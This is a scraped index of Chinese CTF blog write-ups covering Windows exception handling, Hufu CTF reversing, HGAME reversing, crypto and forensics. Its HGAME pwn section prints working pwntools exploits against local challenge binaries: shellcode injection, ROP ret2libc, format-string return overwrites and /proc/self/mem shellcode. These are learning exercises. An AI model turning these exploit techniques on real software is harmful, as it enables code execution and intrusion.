https://pypi.org/project/whitesymex/ https://github.com/umutoztunc/whitesymex https://github.com/Smithers888/BlueSpace Vidar-Team writeup","link":"/2021/06/02/XCTF-Final-Spaceship/"},{"title":"windows 异常处理","text":"简单总结一下有关 Windows 处理异常方面的知识 SEHSEH 简单说明​ SEH是基于栈的异常处理，作用范围仅限当前线程，在程序产生异常时，如果程序正在被调试os 就会先把异常抛给调试器处理 ，调试器无法解决这一异常就会由进程处理，进程也无法处理就会交由 os 处理。 SEH 结构TEB 结构体​ TEB 结构体是操作系统为了保存线程私有数据而创建的，TIB 是保存线程基本信息的数据结构。 ​ 在 x86 用户模式下可以由 FS 寄存器来访问当前线程 TEB数据，64位系统中则使用 gs 寄存器 SEH 的链式结构​ SEH 以链的形式存在，即链表，结构如图所示： ​ SEH 会在链表的头部进行异常处理函数的安装与卸载 TEB.NtTib.ExceptionList = FS:[0] ExceptionList 是 TIB 中与异常处理有关的项，指向 SEH 链 安装与卸载 安装 push @MyHandler ;异常处理程序push FS:[0] ；SEH Linked List头mov dword ptr fs:[0],esp ;添加链表 卸载 mov esp,dword ptr fs:[0]pop dword ptr fs:[0] ​ 安装与卸载一般发生在函数开始与结束处 VEH​ 当异常发生时，VEH 会在 SEH 之前执行，如果 VEH 无法处理这一异常，就会由 SEH 继续处理异常 ​ 可通过 AddVectorExceptionHandler 这个 API 来注册回调函数，第一个参数可指定回调函数安装与卸载是在链表前端还是尾部 ​ 作用范围为整个进程，可捕获所有线程的异常 ​ 想要获取 VEH 异常的函数地址应该可以看程序中是否用到 AddVectorExceptionHandler 这个 API，第二个参数是异常处理函数 例子​ minilctf re2 ​ 这里存在两个触发异常的点，一个是访问到了不能访问的内存，另一个是除0异常 ​ 在 main 函数的开头发现异常处理函数安装的汇编代码，但调试过程中在 __except_handler4 下断点程序并不会停下，这里的 __except_handler4 里的函数应该是编译器添加的 ​ 在 TLS 函数中可以发现注册了 VEH 的异常处理程序，根据 VEH 会先于 SEH 执行，在 Handler 函数下断就能使指定的异常触发时停下 ​ 当然有关 Windows 异常处理的知识还有很多，本文没有提到，待填 参考资料 《加密与解密》 《逆向工程核心原理》 SEH详解 AddVectoredExceptionHandler 获取VEH SEH VCH UEF异常的函数地址 VEH分析 Windows调试艺术——从0开始的异常处理（下）","link":"/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"title":"2021数字中国虎符CTF Re题复现","text":"2021虎符CTF Re 1.redemption_code分析：​ 这题的重点在于理解验证兑换码函数 server_check_redemption_code 的算法 123456789101112131415161718192021222324252627282930int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; //能在str中找到与flag[i]相同的字符就移向下一行继续找 if (v7 == tmp) //str中包含flag的全部字符 return k - tmp + 1; // =7 } return -1;} ​ ​ 用图来解释一下 ​ s数组相当于一个14*256的二维数组（输入长度得是14），函数内双重循环代表在以 flag[i] 为下标的地方存储当前的 i+1 值（第几个字符） str1[] = “Ninja Must Die 3 Is A Cruel Game, So Hard For Me”str2[] = “I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.” ​ pre 函数检测 str1，根据check函数最后的循环返回结果不能是 -1，确定 flag 字符串在 str1中 ​ 检测 str2 的时候因为返回值要是7，所以 flag 结尾字符是 str2[20] = ‘e’，flag = “Ninja Must Die” 验证：123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; if (v7 == tmp) return k - tmp + 1; // =7 } return -1;}int main(){ char str1[]=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;; char str2[]=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;; char flag[]=&quot;Ninja Must Die&quot;; printf(&quot;%d&quot;,server_check_redemption_code(str1,flag)); printf(&quot;%d&quot;,server_check_redemption_code(str2,flag)); system(&quot;pause&quot;); return 0;} 2.GoEncrypt分析：​ go 语言逆向，main_main 函数反汇编后可以看到有个 main_check ，main_NewCipher ，两个 Encrypt 加密，最后 internal_bytealg_Equal 比较​ check 里面有 flag 的格式 ^flag{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})} ​ 可以构造 flag 进行调试 flag{abababab-abab-abab-abab-abababababab} ​ 图中的函数将输入转为16进制，如 0xabababababababababababababababab，之后再分割成4个16进制数​ 加密的函数根据特点可以知道是 XTEA 加密​​ 调试到 encrypt 函数时可以发现两个 encrypt 分别对两个4位的16进制数进行加密，密钥如下 ​ 之后可以在 internal_bytealg_Equal 函数内找到 flag 的密文 ​ 前面那些看起来像是汇编代码的实际调试时并不执行，关键只在这一部分 脚本：12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define uint32_t unsigned intvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x12345678, sum = delta * num_rounds; for (i = 0; i &lt; num_rounds; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main(){ //uint32_t v1[2]={0x0EC311F0,0x45C79AF3 }; uint32_t v[2] = { 0xedf5d910,0x542702cb}; uint32_t const k[4] = { 0x10203,0x4050607,0x8090a0b,0xc0d0e0f }; unsigned int r = 32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decipher(r, v, k); printf(&quot;解密后的数据：0x%x 0x%x\\n&quot;, v[0], v[1]); return 0;} 3.Crackme​ 反汇编出来 500 多行，要调试吐了。。。 分析：​ 先是输入一个长度为17的字符串，然后输入一个数字，对输入的数字进行运算后再判断 ​ ​ 虽然这个函数 ida 提示说结果可能错误，但是实际运算跟反汇编出来的是一样的（比赛当天因为这个卡了好久，一直在试图调试出正确的运算过程） ​ 想要得到这个数字可以采取爆破的方法，多次输入并调试来缩小范围 ​ 之后把第一个输入的字符串分为前7个和后10个，分别异或加密 脚本：123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include&lt;math.h&gt;double cal(double a1,double a2){ double temp = pow(a1, a2 - 1.0); double result = temp / exp(a1); return result;}int main(){ int v94 = 0.0; for(v94=90000;v94&lt;100000000;v94++) { double v15 = 0.0; double v16 = 0.0; double v17 = 0.0; double v18 = (double)((int)v94 / 12379) + 1.0; do { v16 = v16 + cal(v17, v18) * 0.001; v17 = v17 + 0.001; } while ( v17 &lt;= 100.0 ); double v19 = (int)(v16 + v16 + 3.0); double v20 = 0.0; double v21 = (double)(v94 % 12379) + 1.0; do { v15 = v15 + cal(v20, v21) * 0.001; v20 = v20 + 0.001; } while ( v20 &lt;= 100.0 ); if(v19 == 0x13b03 &amp;&amp; (int)(v15 + v15 + 3.0) == 0x5a2) { printf(&quot;%d&quot;,v94); break; } } system(&quot;pause&quot;); return 0;}//99038 123456789101112131415161718192021a7 = [0x08, 0x4D, 0x59, 0x06, 0x73, 0x02, 0x40]number = &quot;99038198076198076198076198076198076&quot;#输入数字乘2接到后面k = [0xe0,0x95,0xba,0x60,0xc9,0x66,0x2a,0x24,0xb2,0x36]a10 = [0xB2, 0xD6, 0x8E, 0x3F, 0xAA, 0x14, 0x53, 0x54, 0xC6, 0x06]flag = []for i in range(7): c = chr(a7[i] ^ ord(number[i])) flag.append(c)flag1 = ''.join(flag)print(flag1)#1ti5K3yfor i in range(10): d = chr(k[i] ^ a10[i]) flag.append(d)flag_last = ''.join(flag)print(flag_last)#1ti5K3yRC4_crypt0#后面那个原来是RC4吗","link":"/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"title":"HGAME  Pwn 题学习","text":"Hgame Pwn题 1.letter所需知识： ​ 计算机中有符号数用补码来表示（用原码或反码表示都会出现重复的0），正数的补码是数本身，负数的补码是原码按位取反加 1 ，负数补码取反加 1 是其绝对值 题解：​ 题目中没有 system() 来 getshell，参考官方 writeup 知道没开 NX保护就可以在堆栈上写入 shellcode 并执行 ​ 输入有个长度判断，根据有符号数和无符号数可以 -1 绕过 ​ 因为要在栈上执行代码所以需要 jmp rsp ，用 ROPgadget 查一下 ROPgadget –binary ./letter | grep “jmp rsp” ​ 没发现有 jmp rsp ，看了一下 writeup 尝试用输入的负数构造 jmp rsp，用 ida 查看机器码为 FF E4（FF E4就是内存中的顺序），int 为四字节所以构造 F0 00 E4 FF 的负数 -268376833 （最高位是 1 ，然后转为无符号数稍微大点的大概都行吧。。。，但是我用 FF 00 E4 FF 的时候偶尔会出错） ​ 这里可以看到程序利用沙箱只允许使用部分系统调用，第二个参数是白名单的意思，可以根据系统调用号查得只允许使用 open ，read ，write，或者用 seccomp-tools 直接看开了什么。那么接下来就用这几个系统调用来打开并读取 flag 文件内容 ​ 下面是 exp 123456789101112131415161718192021from pwn import *context.arch = 'amd64'context.log_level = 'debug'r = process('./letter')r.sendlineafter('?','-268376833')#程序是 amd64 的shellcode = shellcraft.amd64.open('./flag')shellcode += shellcraft.amd64.read('rax','rsp',0x30)shellcode += shellcraft.amd64.write(1,'rsp',0x30)r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))r.interactive() ​ 本地复现结果 2.once所需知识： 32位程序中的 printf 函数逆序传参，参数都存放在栈上64位程序中的 printf 函数也是逆序传参，前 6 个参数（从右到左）存放在寄存器中，依次为 RDI、RSI、RDX、 RCX、 R8以及R9 ，其他多的参数存在栈上 题解：​ 先用 checksec 查一下，开启了 PIE 保护 ​ ida 反编译发现 ​ 没有直接的 system 或 execve 来 getshell，但 vuln 函数里有格式化字符串漏洞 printf ，题目中也给了 libc版本，可以 leak 出 libc 基址再加上 one_gadget 来 getshell ​ Constraints 意思是限制条件，不满足条件的没法用 ​ 下面是 exp 1234567891011121314151617181920212223242526from pwn import *libc = ELF('./libc-2.27.so')r = process('./once')context.log_level = 'debug'pay1 = '%13$p\\n' pay1 = pay1.ljust(0x28,'a') #补齐到 0x28pay1 += '\\xD3'r.sendafter('turn: ',pay1)addr = r.recvuntil('\\n')addr = addr.strip('\\n')addr = int(addr,16) #int函数有第二个参数那第一个参数要是字符，第二个参数表示输入的进制数libcbase = addr - 231 -libc.symbols['__libc_start_main']pay2 = 'a' * 0x28 + p64(libcbase + 0x4f3d5)r.sendlineafter('turn: ',pay2)r.interactive() ​ ​ 开启了 pie 随机化，但因为内存分页制度（好像是这个）地址的最低12位是不变的，所以可以覆盖返回地址最低位的一个字节来回到 vuln 函数开头 ​ 关于为什么是 D3 而不是 D2 我还没弄明白，此处待填（https://hack543.com/16-bytes-stack-alignment-movaps-issue/） ​ 还有 libc_start_main 地址泄露的 %13$p（输出第13个参数） 3.rop_primary所需知识：​ rop 学习：https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc ​ 延迟绑定机制： ​ 函数等到用到时才进行绑定，第一次调用时 got 表里保存的是 plt表 push XX 的地址，然后 _ dl_runtime_resolve () 函数会去 libc 库里找到函数真正的地址写到 got 表里 ​ ​ x86 与 x64 ROP区别（vidar 培训的图）： 题解：​ ​ 开了 NX 保护，那就是 rop 绕过，ida f5 可以看到有通过命令行参数（argv[1]）打开的文件，之后在文件里读取三个矩阵，本地调试的话可以构造一个这样的文件。check 函数检测矩阵 a，b 进行乘法运算的结果与 c 矩阵比较 ​ vuln 函数可以溢出，没有 system 和 /bin/sh，那就需要通过 read 函数泄露 libc 版本获得 ​ 下面是 exp（因为自己写的 exp 不小心删掉了，所以前面矩阵运算借鉴了官方 writeup 的） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *from LibcSearcher import *def read_martix(): matrix = [] while True: line = r.recvuntil('\\n').strip() if '\\t' not in line: break row = [] for num in line.split('\\t'): row.append(int(num)) matrix.append(row) return matrix def multi(a, b): rows = len(a) mid = len(b) cols = len(b[0]) martixC = [] for i in range(rows): row = [] for j in range(cols): num = 0 for k in range(mid): num += a[i][k] * b[k][j] row.append(num) martixC.append(row) return martixCcontext.log_level = 'debug'context.arch = 'amd64'elf = ELF('./rop_primary')r = elf.process(argv = ['martix']) #添加命令行参数r.recvuntil('A:\\n')martixA = read_martix()martixB = read_martix()martixC = multi(martixA,martixB)for row in martixC: for n in row: r.sendline(str(n))poprdi = 0x401613 #用 ROPgadget 获取 poprdi ; ret 地址ret = 0x40101a again = 0x40157Cpay = 'a'*0x38 + p64(poprdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])pay += p64(again)r.sendlineafter('best\\n',pay)#leak并计算基址leak_addr = u64(r.recv(6).ljust(8,'\\x00'))libc = LibcSearcher('puts',leak_addr)libcbase = leak_addr - libc.dump('puts')binsh = libcbase + libc.dump('str_bin_sh') system = libcbase + libc.dump('system')#getshellpay2 = 'a'*0x38 + p64(poprdi) +p64(binsh) + p64(system)r.sendlineafter('best\\n',pay2)r.interactive() 4.killer queen格式化字符串，改 retn 地址，注意 memset 操作会覆盖 format，所以需要 choice1 写入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherr = process('./killerqueen')context.log_level='debug'#context.terminal = ['tmux','splitw']#gdb.attach(r,&quot;break choice2&quot;)#gdb.attach(proc.pidof(r)[0],&quot;break choice2&quot;)r.sendlineafter(&quot;X、去接将要打来的电话\\n&quot;,'0')weather = int(r.recvuntil(&quot;:&quot;)[:-1])print(weather)payload = 'a'.ljust(0x100,'a')r.sendlineafter(&quot;说点什么\\n&quot;,payload)#leak libc 地址payload = b&quot;%19$p-%38$p&quot;r.sendlineafter(&quot;X、去接将要打来的电话\\n&quot;,str(4294967294-weather))r.sendlineafter(&quot;那么，电话号码是——\\n&quot;,payload)r.recvuntil(&quot;「Killer Queen」杀死了岸边露伴...\\n&quot;)stdout = int(r.recvuntil('-')[:-1],16)retn_addr = int(r.recvuntil('\\n')[:-1],16)log.success(&quot;stdout_addr: &quot;+hex(stdout))log.success(&quot;retn_addr: &quot;+hex(retn_addr))libc = LibcSearcher(&quot;_IO_2_1_stdout_&quot;,stdout)libc_base = stdout - libc.dump('_IO_2_1_stdout_')onegadget = 0x4f3d5print(hex(libc_base+onegadget))target = libc_base+onegadgetretn_addr += 8#覆盖返回地址if target&amp;0xffff &gt; ((target&amp;0xffff0000)&gt;&gt;16): payload = (&quot;%&quot;+str((target&amp;0xffff0000)&gt;&gt;16)+&quot;c&quot;+&quot;%10$hn&quot;+&quot;%&quot;+str((target&amp;0xffff)-((target&amp;0xffff0000)&gt;&gt;16))+&quot;c&quot;+&quot;%11$hn&quot;).ljust(32,'a')+p64(retn_addr+2)+p64(retn_addr)else: payload = (&quot;%&quot;+str(target&amp;0xffff)+&quot;c&quot;+&quot;%10$hn&quot;+&quot;%&quot;+str((target&amp;0xffff0000)&gt;&gt;16 - (target&amp;0xffff))+&quot;c&quot;+&quot;%11$hn&quot;).ljust(32,'a')+p64(retn_addr)+p64(retn_addr+2)r.sendlineafter(&quot;说点什么\\n&quot;,payload)r.sendlineafter(&quot;说点什么\\n&quot;,'aaa')r.interactive() 5.patriot’s note6.the_shop_of_cosmosproc 文件系统，/proc/self/mem 可读写程序，包括 .text 段，/proc/self/maps 获取各种基址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *r = process('./shop')elf = ELF('./shop')context.log_level='debug'context.arch = 'amd64'libc = ELF('./libc.so.6')# 增加钱r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'-50')# 获取基址r.sendlineafter(&quot;&gt;&gt; &quot;,'2')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'/proc/self/maps')r.recvuntil('：')prog_base = int(r.recvuntil('-')[:-1],16)log.success(&quot;prog_base: &quot;+hex(prog_base))# 写 shellcoder.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'/proc/self/mem')r.sendlineafter(&quot;&gt;&gt; &quot;,str(prog_base+0x1652))shellcode = asm(shellcraft.sh())r.sendlineafter(&quot;&gt;&gt; &quot;,str(len(shellcode)))r.sendlineafter(&quot;&gt;&gt; &quot;,shellcode)r.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.interactive()","link":"/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"},{"title":"HGAME-Week4-Writeup","text":"Week4 Re1.vm​ 这部分逻辑很清晰，重点在中间这个加密的部分，点进去查看这个函数发现 switch-case 应该是vm，每个case都是一个 opcode ​ 题目里说 ovm++ hates debugger ，那就先调试一下，调试后可以猜测出具体的加密部分 ​ 输入的 flag 先是经过异或加密，之后又有减法操作，加密后与密文进行比较，写脚本解一下就能得到 flag 12345678910111213cipher = [0xcf,0xbf,0x80,0x3b,0xf6,0xaf,0x7e,0x02,0x24,0xed,0x70,0x3a,0xf4,0xeb,0x7a,0x4a,0xe7,0xf7,0xa2,0x67,0x17,0xf0,0xc6,0x76,0x36,0xe8,0xad,0x82,0x2e,0xdb,0xb7,0x4f,0xe6,0x09]table1 = [0xFE,0x21,0x44,0x67,0x8A,0xAD,0xD0,0xF3,0x16,0x39,0x5c,0x7f,0xa2,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x00,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81]table2 = [0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a]for i in range(34): if cipher[i] + table2[33-i] &lt; 256: cipher[i] += table2[33-i] else: cipher[i] = cipher[i] + table2[33-i] - 256for i in range(34): cipher[i] ^= table1[33-i] print(chr(cipher[i]),end = &quot;&quot;) ​ 这道题标准解法应该不是这样解的，而是要先要翻译出对应的汇编代码再分析，但这部分我还不太明白之后再补上吧 2.A 5 Second Challenge​ 这题要感谢小圆学长的耐心回答!! ​ 下载得到的是用unity制作的扫雷游戏，刚开始为了获得源码用 il2cppdumper 处理 GameAssembly.dll ，但发现处理后得到的不全，之后问了一下小圆学长发现源码已经给了。 ​ 打开 AFiveSecondChallenge.cpp ，源码里有 getUnixtime 这类获取时间的函数，游戏时间超过 5s 就会显示超时，用锁住系统时间的软件可以避开这一检测。锁定时间后就可以开始玩扫雷，几局下来后会发现雷的位置能构成二维码 ​ 根据题目提示，把 managed 文件夹下的 dll 拖到 ida 里，会发现有一个函数被nop掉了，定位到源码里查看（il2cpp的中间文件有些混乱，删除了影响判断的部分） ​ 这里的 return 判断是否是雷的位置，本来分析到这里已经很清楚了但是因为我完全不懂类和方法什么的看了挺久 ​ GetAt函数的返回值没在源码里看到有初始赋值于是迷惑了好久，又去问了一下小圆学长这部分是在哪里初始化过，得到回复说是在那个 dll 里面。 ​ 但是我在我下载的东西里面没发现 m_Items 初始化的部分，去网站上重新下载并拖到 ilspy ，得到了这个数组里的值 ​ 接下来就是写脚本解题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;stdio.h&gt;#include&lt;math.h&gt;double matrix[45][15][3] = ;double GetAt(i, j, k){ int iBound = 45; //45 int jBound = 15; //15 int kBound = 3; //3 return matrix[i][j][k];}int main(){ int y,x; FILE* fp; fp = fopen(&quot;************&quot; , &quot;w&quot;); int a[45][45]; int i, j; for (y = 0; y &lt; 45; y++) { for (x = 0; x &lt; 45; x++) { double L_8 = GetAt(y, x / 3, 0); double L_14 = GetAt(y, x / 3, 1); double V_0 = L_14; double L_20 = GetAt(y, x / 3, 2); double V_1 = L_20; double V_2 = fmod(x, 3.0f) - 1.0f; a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; 0.0 ? 1 : 0; //1是雷 } } for (i = 0; i &lt; 45; i++) { for (j = 0; j &lt; 45; j++) { printf(&quot;%d&quot;, a[j][i]); if (a[j][i] == 1) fprintf(fp, &quot;%d,%d\\n&quot;, j, i); } printf(&quot;\\n&quot;); } fclose(fp); return 0;} 123456import matplotlib.pyplot as pltimport numpy as npx,y = np.loadtxt('./xy.txt',delimiter=',',unpack=True)plt.plot(x,y,'.')plt.show() 3.nllvm​ 拖到 ida 里发现挺乱的，也没看到控制台输出的那些文字，那就先调试看看 ​ 调试后发现这些异或操作得到的就是控制台输出的字符，在输出后又来了一遍异或还原。 ​ 接着调试发现判断输入字符串的地方 ​ 这一部分异或得到 “CryptoFAILUREforRSA2048Key!!!!!!” 这个字符串，接着来到加密的函数 ​ 传入的就是这部分异或得到字符串和输入的 flag，之后看了一下这个函数里面是一些比较复杂的运算猜测是某种算法，我对各种算法不是很熟所以用了 ida 插件 findcrypt ，但是这个插件并没有找到什么算法于是我就去找学长确认了一下 ​ 查了各种算法，最后发现加密函数里面的一个函数像是s盒，根据s盒数字判断又是 AES 加密 ( s盒也是异或得到的，这大概是插件检测不出算法的原因 ) ​ 在调试过程中可以知道 iv值是 123456789abcdef ，判断是否为正确 flag 的部分与密文进行比较，改变了输出字符的外观（表示是否回到现实） ​ 之后用我在week2写的脚本解就行 ​ 查了一下题目里的 llvm ，是一款代码混淆器，具体的是看了这篇文章https://bbs.pediy.com/thread-224484.htm Misc1.Akira之瞳-1​ 查资料知道这种 dump 出来的RAW 文件要在 linux 里用 volatility 看，先查一下系统版本 ​ 接着用 pslist 查看一下系统进程，找到可疑的进程后 dump 出来 ​ 用 foremost 分离出一个加密的压缩包，本来以为密码还在 raw 文件里面的某个文件里来回看了好多遍，之后用 010editor 打开压缩包后发现提示，zip 密码是系统登陆密码 ​ hashdump 一下得到登陆密码的 hash 值 ​ 按提示把密码解出来 ​ 打开压缩包后发现两张图片，名字是src 和 blind，很容易就想到盲水印，用这个工具 (https://github.com/chishaxie/BlindWaterMark) 提取出水印 ​ 图片里小写的 L 是数字1 2.Akira之瞳-2​ 得到一个加密压缩包和 RAW 文件，同样先查看一下进程，发现 notepad进程 dump出来 ​ 在 dump 出来的进程里查一下 password 字符串，得到 zip 密码 ​ 打开压缩包得到 ​ 这几个文件名好像在哪里见过，翻了一下往年的 writeup 知道container 是加密容器，cookies 是chrome浏览器的 cookie 数据库。但是看 cookies 文件内容和打开加密卷都需要密码，回到 linux 里再查一下有无密码，因为是 notepad 进程那就查 txt 文件 ​ 这个 dumpme.txt 很可疑，提取出来发现之前 zip 密码还有后半句。百度一下知道 lastpass 是 chrome 浏览器的插件，用来记录密码的，把 lastpass 和 dump 放在一起搜索找到 volatility 里有 lastpass 这个插件 ​ 得到一个密码，下载 ChromeCookiesView ，加载 cookies 文件并输入密码，得到加密容器密码并提示用 VeraCrypt 打开 ​ 打开虚拟分区得到一张图片，查 ADS 得知 NTFS 隐写 ​ NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。 ​ 然后用 Ntfs Streams Editor 这个软件查看 ADS 流文件，得到 flag ​ 那个网址里的图是 Akira 学长的新头像 总结​ 为时四周的 hgme 要结束了，这个寒假学到了很多东西过得很充实，希望以后能继续学习这方面的知识，不断进步","link":"/2021/03/27/HGAME-Week4-Writeup/"},{"title":"HGAME-Week3-Writeup","text":"Week3 Re1.FAKE​ 拖到ida ​ 关键函数里有36个方程，36个变量，那就不可能普通的解出来， ​ 查找字符串得到提示 Try angr or z3，我用的是 z3库，脚本太长了就不放了（用z3库解的时候一直跑不出结果，就去问了 r3n0学长，学长说可能需要点时间，但之后我重新弄了一下add的部分很快就跑出来了，应该是我自己中间操作上的问题….） ​ 假flag，查一下SMC 1SMC(self-Modifying Code)，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。 ​ 在ida里找一下smc自解密的部分 ​ 这段代码执行后才得到真正的代码，写 idc 脚本来解密 ida 反编译后错误的代码 123456789101112#include &lt;idc.idc&gt;static main(){ auto addr = 0x00401216; //函数地址 auto addr2 = 0x00409080; //byte数组地址 auto i = 0; for(i=0;i&lt;=0x43E;i++) { PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i)); }} ​ 得到运行过程中真正的代码 ​ 这部分继续用z3库写脚本去解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from z3 import *s = Solver()a1 = [0] * 36for i in range(36): a1[i] = Int('a1[' + str(i) + ']')v3 = [0]*36v2 = [0]*36v4 = [0]*36v3[0] = 55030v3[1] = 61095v3[2] = 60151v3[3] = 57247v3[4] = 56780v3[5] = 55726v3[6] = 46642v3[7] = 52931v3[8] = 53580v3[9] = 50437v3[10] = 50062v3[11] = 44186v3[12] = 44909v3[13] = 46490v3[14] = 46024v3[15] = 44347v3[16] = 43850v3[17] = 44368v3[18] = 54990v3[19] = 61884v3[20] = 61202v3[21] = 58139v3[22] = 57730v3[23] = 54964v3[24] = 48849v3[25] = 51026v3[26] = 49629v3[27] = 48219v3[28] = 47904v3[29] = 50823v3[30] = 46596v3[31] = 50517v3[32] = 48421v3[33] = 46143v3[34] = 46102v3[35] = 46744v2[0] = 104v2[1] = 103v2[2] = 97v2[3] = 109v2[4] = 101v2[5] = 123v2[6] = 64v2[7] = 95v2[8] = 70v2[9] = 65v2[10] = 75v2[11] = 69v2[12] = 95v2[13] = 102v2[14] = 108v2[15] = 97v2[16] = 103v2[17] = 33v2[18] = 45v2[19] = 100v2[20] = 111v2[21] = 95v2[22] = 89v2[23] = 48v2[24] = 117v2[25] = 95v2[26] = 107v2[27] = 111v2[28] = 110v2[29] = 119v2[30] = 95v2[31] = 83v2[32] = 77v2[33] = 67v2[34] = 63v2[35] = 125for i in range(0,6): for j in range(0,6): for k in range(0,6): v4[6 * i + j] += v2[6 * k + j] * a1[6 * i + k]for i in range(0,6): for j in range(0,6): s.add(v4[6*i+j] == v3[6 * i + j])s.check()result = s.model()for i in range(0, 36): print(result[a1[i]], end=' ') Crypto1.LikiPrime​ 还是 RSA，不过素数 N 更大了，但是放到网站里分解还是能分解出 q和 p，之后就是用上周的脚本跑出flag 2.HappyNewYear!!​ e = 3，发送内容相同，自然就想到低指数广播攻击，但是广播攻击只需要 e组数据，那么猜测给的数据里解出来的明文不是全部相同。 ​ 低指数广播攻击需要用到中国剩余定理（孙子定理），脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344from libnum import n2simport gmpy2from functools import reducedef modinv(a, m): return int(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))def chinese_remainder(n, a): sum = 0 prod = reduce(lambda a, b: a * b, n) for n_i, a_i in zip(n, a): p = prod // n_i sum += a_i * modinv(p, n_i) * p return int(sum % prod)n1 = c1 = n2 = c2 = n3 = c3 = n4 = c4 = n5 = c5 =n6 = c6 = n7 = c7 = nset = [n2,n4,n6]cset = [c2,c4,c6]m = chinese_remainder(nset, cset)m = gmpy2.iroot(m,3)m = int(m[0])print(n2s(m)) c1,c3,c5 解密得到一个片段，c2,c4,c6解密得到剩下的flag片段（本来写的是随机在给出的7组数据里挑三组解密，但是没跑出结果，后来手动试了一下试出来了） Misc1.A R K​ 打开下载的流量包，首先看到dns里的域名 ​ 刚开始以为跟网址有关，但后来题目里说 “本题目所有解题操作均只用流量，与网址无关” ，那就接着看其他包，查资料知道 TLS 加密尝试找到流量包里的证书 ​ 导出原始数据保存为 ssl.log ,再重新导入解密 ​ 找到解密后的 HTTP 流，导出后得到一堆json文件，导出来后卡了一段时间，之后看到题目的补充信息 ​ 补充说明：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。 翻译：没用 没用 